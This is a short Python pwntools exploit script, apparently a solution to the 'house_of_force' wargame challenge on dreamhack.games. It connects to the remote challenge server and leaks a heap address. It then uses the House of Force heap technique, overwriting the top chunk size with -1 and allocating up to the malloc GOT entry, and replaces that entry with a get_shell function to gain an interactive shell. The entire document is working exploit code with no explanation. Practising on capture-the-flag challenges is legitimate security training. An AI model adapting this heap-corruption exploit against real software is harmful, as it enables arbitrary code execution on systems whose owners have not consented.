from pwn import *

#p = process('./house_of_force')
p = remote('host3.dreamhack.games', 20615)
e = ELF('./house_of_force')

malloc_got = e.got["malloc"]
def add(size, data):
    p.sendlineafter(b"> ", b"1")
    p.sendlineafter(b"Size: ", str(size).encode())
    p.sendlineafter(b"Data: ", data)

def edit(idx, ptr, data):
    p.sendlineafter(b"> ", b"2")
    p.sendlineafter(b"ptr idx: ", str(idx).encode())
    p.sendlineafter(b"write idx: ", str(ptr).encode())
    p.sendlineafter(b"value: ", str(data).encode())

add(0x8, b"a"*4)
leak_heap = int(p.recvuntil(b":")[:-1], 16)
chunk_top = leak_heap + 0x8 + 0x8
print(hex(chunk_top))

edit(0, 3, -1)
offset = malloc_got - chunk_top - 0x8

add(offset, b"a"*4)
add(0x8, p32(e.sym["get_shell"]))
p.sendlineafter(b"> ", b"1")
p.sendlineafter(b"Size: ",b"4" )

p.interactive()